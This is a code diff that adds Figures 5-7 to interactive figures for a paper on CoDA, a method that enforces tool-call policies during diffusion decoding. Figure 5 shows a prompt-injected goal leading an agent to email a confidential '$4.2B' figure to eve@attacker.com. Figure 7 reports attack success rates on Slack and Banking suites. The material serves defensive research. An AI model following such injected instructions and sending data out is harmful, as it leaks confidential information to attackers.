@@ -1,4 +1,4 @@
-/* Interactive HTML versions of the CoDA paper figures (Figures 1, 2 and 4). */
+/* Interactive HTML versions of the CoDA paper figures (Figures 1, 2 and 4, plus Figures 5-7 ported from the talk slides). */
 (function () {
   "use strict";
   var NS = "http://www.w3.org/2000/svg";
@@ -280,6 +280,127 @@
     whenVisible(svgEl, grow);
   }
 
+  /* ---------- Figure 5: why left-to-right decoding is too late (from the talk slides) ---------- */
+  function fig5(root) {
+    var Q = chip("[MASK]", "q");
+    function f(k, v, cls) { return '<span class="f5-field"><span class="f5-k">' + k + "</span>" + chip(v, cls) + "</span>"; }
+    var P = '<span class="f5-k">policy</span>';
+    var steps = [
+      { label: "t = T: nothing generated yet",
+        ar: [f("call:", "&#8230;", "q"), f("to:", "&#8230;", "q"), f("body:", "&#8230;", "q")], arNote: "Positions are produced strictly left to right.",
+        dd: [f("call:", "[MASK]", "q"), f("to:", "[MASK]", "q"), f("body:", "[MASK]", "q")], ddNote: "The whole call starts as noise." },
+      { label: "The tool call is written",
+        ar: [f("call:", "send_email"), f("to:", "&#8230;", "q"), f("body:", "&#8230;", "q")], arNote: "No violation yet.",
+        dd: [f("call:", "send_email"), f("to:", "[MASK]", "q"), f("body:", "[MASK]", "q")], ddNote: "Other positions are refined in parallel." },
+      { label: "The recipient is written first",
+        ar: [f("call:", "send_email"), f("to:", "eve@attacker.com", "bad pop locked"), f("body:", "&#8230;", "q")], arNote: "The body does not exist yet, so the rule \"body has $ amounts &#8594; to must be @corp.com\" cannot fire.", arState: "warn",
+        dd: [f("call:", "send_email"), f("to:", "eve@attacker.com", "bad pop"), f("body:", "$4.2B&#8230;", "pop")], ddNote: "to: and body: are drafted together, so the rule can already see both." },
+      { label: "The policy meets the draft",
+        ar: [f("call:", "send_email"), f("to:", "eve@attacker.com", "bad locked"), f("body:", "$4.2B&#8230;", "pop")], arNote: "The rule fires now, but to: is already committed. Too late.", arState: "bad",
+        dd: [f("call:", "send_email"), f("to:", "eve@attacker.com", "bad struck") + chip("alice@corp.com", "good pop"), f("body:", "$4.2B&#8230;")], ddNote: "Projection removes the violating recipient and keeps the body draft.", proj: true },
+      { label: "t = 0: final action", done: true,
+        ar: [f("call:", "send_email"), f("to:", "eve@attacker.com", "bad locked"), f("body:", "$4.2B&#8230;")], arNote: "Unsafe action: the figure leaves the company.", arState: "bad",
+        dd: [f("call:", "send_email"), f("to:", "alice@corp.com", "good"), f("body:", "$4.2B&#8230;")], ddNote: "Safe action: complies with the policy.", ddState: "good" }
+    ];
+    root.innerHTML =
+      '<p class="f1-title">Left-to-Right vs. Whole-Sequence Enforcement</p>' +
+      '<p class="f1-sub">Policy: <code>if body matches $&#8230;B then to &#8712; *@corp.com</code>. Injected goal: send the figure to eve@attacker.com.</p>' +
+      '<div class="f5-grid">' + lane("ar") + lane("dd") + "</div>" +
+      '<div class="fig-controls"><button type="button" class="f5-play">Play</button><button type="button" class="f5-reset">Reset</button>' +
+        '<input type="range" class="f5-range" min="0" max="' + (steps.length - 1) + '" value="0" aria-label="Generation step">' +
+        '<span class="f5-step"></span></div>';
+    function lane(kind) {
+      var ar = kind === "ar";
+      return '<div class="f5-lane ' + kind + '"><div class="f5-hd"><b>' + (ar ? "Autoregressive + constrained decoding" : "Diffusion + CoDA") + "</b>" +
+        (ar ? "Masks one next token at a time." : "Projects the whole draft at every step.") + "</div>" +
+        '<div class="f5-seq"></div><div class="f5-tag-row"><span class="f5-tag proj">Policy projection</span></div><div class="f5-note"></div></div>';
+    }
+    var range = root.querySelector(".f5-range"), btn = root.querySelector(".f5-play"), lbl = root.querySelector(".f5-step");
+    var lanes = { ar: root.querySelector(".f5-lane.ar"), dd: root.querySelector(".f5-lane.dd") };
+    var last = steps.length - 1, cur = last, timer = null;
+    function show(i) {
+      cur = i; range.value = i; var s = steps[i];
+      ["ar", "dd"].forEach(function (k) {
+        var l = lanes[k];
+        l.querySelector(".f5-seq").innerHTML = s[k].join("");
+        var n = l.querySelector(".f5-note"); n.innerHTML = s[k + "Note"];
+        n.className = "f5-note" + (s[k + "State"] ? " " + s[k + "State"] : "");
+        l.querySelector(".f5-tag.proj").classList.toggle("on", !!(k === "dd" && s.proj));
+      });
+      lbl.textContent = "Step " + (i + 1) + " of " + steps.length + ": " + s.label;
+    }
+    function stop() { clearInterval(timer); timer = null; btn.textContent = "Play"; }
+    function play() {
+      if (cur >= last) show(0);
+      btn.textContent = "Pause";
+      timer = setInterval(function () { show(cur + 1); if (cur >= last) stop(); }, 1500);
+    }
+    btn.addEventListener("click", function () { if (timer) stop(); else play(); });
+    root.querySelector(".f5-reset").addEventListener("click", function () { stop(); show(last); });
+    range.addEventListener("input", function () { stop(); show(+range.value); });
+    show(last);
+    whenVisible(root, function () { play(); });
+  }
+
+  /* ---------- Figure 6: prefix tries for multi-token values (from the talk slides) ---------- */
+  function fig6(root) {
+    root.innerHTML =
+      '<p class="f1-title">Multi-Token Values: Prefix Tries</p>' +
+      '<p class="f1-sub">Authorized recipients: <b>Alice</b> = <code>Al</code>+<code>ice</code> and <b>Bob</b> = <code>B</code>+<code>ob</code>. Pick the current draft of position 1.</p>' +
+      '<div class="f6-pick"><span>Position 1 draft:</span><button type="button" data-p="Al">Al</button><button type="button" data-p="B">B</button></div>' +
+      '<div class="f6-grid">' +
+        '<div class="f6-box naive"><div class="f6-hd"><b>Naive: mask each position independently</b>pos 1 &#8712; {Al, B}, pos 2 &#8712; {ice, ob}</div><div class="f6-combos"></div></div>' +
+        '<div class="f6-box trie"><div class="f6-hd"><b>CoDA: walk a prefix trie</b>Position 2 may only continue the current prefix</div>' +
+          '<div class="f6-tree"><div class="f6-node root">root</div><div class="f6-kids">' +
+            '<div class="f6-branch" data-p="Al"><div class="f6-node">Al</div><div class="f6-node leaf">ice</div></div>' +
+            '<div class="f6-branch" data-p="B"><div class="f6-node">B</div><div class="f6-node leaf">ob</div></div>' +
+          "</div></div><div class=\"f6-support\"></div></div>" +
+      "</div>" +
+      '<p class="fig-note">The trie is re-walked from the current prefix at every denoising step, so if position 1 later flips, position 2\'s allowed set flips with it.</p>';
+    var kids = { Al: "ice", B: "ob" };
+    function set(p) {
+      root.querySelectorAll(".f6-pick button").forEach(function (b) { b.classList.toggle("on", b.dataset.p === p); });
+      root.querySelector(".f6-combos").innerHTML = ["Al", "B"].map(function (a) {
+        return ["ice", "ob"].map(function (b) {
+          var ok = kids[a] === b, live = a === p;
+          return '<div class="f6-combo' + (live ? "" : " dim") + '">' + chip(a) + chip(b) + " &#8594; " +
+            chip(a + b, ok ? "good" : "bad") + (ok ? " &#10004;" : " &#10008; slips through") + "</div>";
+        }).join("");
+      }).join("");
+      root.querySelectorAll(".f6-branch").forEach(function (br) { br.classList.toggle("on", br.dataset.p === p); });
+      var other = p === "Al" ? "ob" : "ice";
+      root.querySelector(".f6-support").innerHTML = "Position 2 support: " + chip(kids[p], "good pop") + " kept, " +
+        chip(other, "bad struck") + " logit &#8594; &#8722;&#8734;";
+    }
+    root.querySelectorAll(".f6-pick button").forEach(function (b) { b.addEventListener("click", function () { set(b.dataset.p); }); });
+    set("Al");
+  }
+
+  /* ---------- Figure 7: every step vs. last step only (from the talk slides; numbers from Figure 4's data) ---------- */
+  function fig7(root) {
+    var T = 12;
+    function strip(every) {
+      var s = "";
+      for (var i = 0; i < T; i++) s += '<span class="f7-dot' + (every || i === T - 1 ? " on" : "") + '"></span>';
+      return '<div class="f7-strip"><span class="f7-t">t = T</span>' + s + '<span class="f7-t">t = 0</span></div>';
+    }
+    function row(r) { var d = F4.dg.filter(function (x) { return x[1] === r; }); return function (suite) { return d.filter(function (x) { return x[0] === suite; })[0]; }; }
+    var every = row("Oracle"), last = row("Oracle (Last-Step)");
+    function stats(get, cls) {
+      return '<div class="f7-stats">' + ["Slack", "Banking"].map(function (s) {
+        var r = get(s);
+        return '<div class="f7-stat ' + cls + '"><b>' + r[2].toFixed(1) + '%</b><span>' + s + " utility" + (r[3] ? ", " + r[3].toFixed(1) + "% ASR" : "") + "</span></div>";
+      }).join("") + "</div>";
+    }
+    root.innerHTML =
+      '<div class="f7-row good"><div class="f7-hd"><b>CoDA: project at every denoising step</b>Syntax around the constrained span co-adapts over the remaining steps.</div>' +
+        strip(true) + stats(every, "good") + "</div>" +
+      '<div class="f7-row bad"><div class="f7-hd"><b>Last-step ablation: overwrite once, after denoising</b>Same Oracle policy, applied only at the end.</div>' +
+        strip(false) + stats(last, "bad") +
+        '<pre class="f7-code">get_balance(<span class="r">recipient="attacker", amount=500</span>)   <span class="r">&#8592; unparseable</span></pre>' +
+        '<div class="fig-note">The tool name was fixed, but its arguments were written for <code>send_money</code> and never revisited.</div></div>';
+  }
+
   function whenVisible(el, fn) {
     if (!("IntersectionObserver" in window)) { fn(); return; }
     var io = new IntersectionObserver(function (es) { if (es[0].isIntersecting) { io.disconnect(); fn(); } }, { threshold: 0.35 });
@@ -287,7 +408,7 @@
   }
 
   document.addEventListener("DOMContentLoaded", function () {
-    var a = document.getElementById("fig1"), b = document.getElementById("fig2"), c = document.getElementById("fig4");
-    if (a) fig1(a); if (b) fig2(b); if (c) fig4(c); var d = document.querySelector("svg.asr"); if (d) fig3(d);
+    var a = document.getElementById("fig1"), b = document.getElementById("fig2"), c = document.getElementById("fig4"), e = document.getElementById("fig5"), g = document.getElementById("fig6"), k = document.getElementById("fig7");
+    if (a) fig1(a); if (b) fig2(b); if (c) fig4(c); var d = document.querySelector("svg.asr"); if (d) fig3(d); if (e) fig5(e); if (g) fig6(g); if (k) fig7(k);
   });
 })();
